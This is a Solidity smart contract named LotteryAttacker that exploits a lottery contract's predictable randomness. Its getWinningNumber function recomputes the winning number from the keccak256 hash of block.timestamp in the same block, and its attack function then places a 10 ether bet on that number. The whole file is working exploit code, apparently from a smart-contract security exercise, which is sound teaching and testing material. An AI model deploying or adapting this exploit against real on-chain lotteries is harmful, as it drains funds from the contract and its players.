// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/access/Ownable.sol";

interface ILottery {
    function placeBet(uint8 _number) external payable;
}

contract LotteryAttacker is Ownable{
    ILottery public victim;

    constructor(address _victim) {
        victim = ILottery(_victim);
    }

    function attack() external payable onlyOwner {
        uint8 winningNumber = getWinningNumber();
        victim.placeBet{value: 10 ether}(winningNumber);
    }

    function getWinningNumber() public view returns(uint8) {
        return uint8(uint256(keccak256(abi.encode(block.timestamp))) % 254) + 1;
    }
}


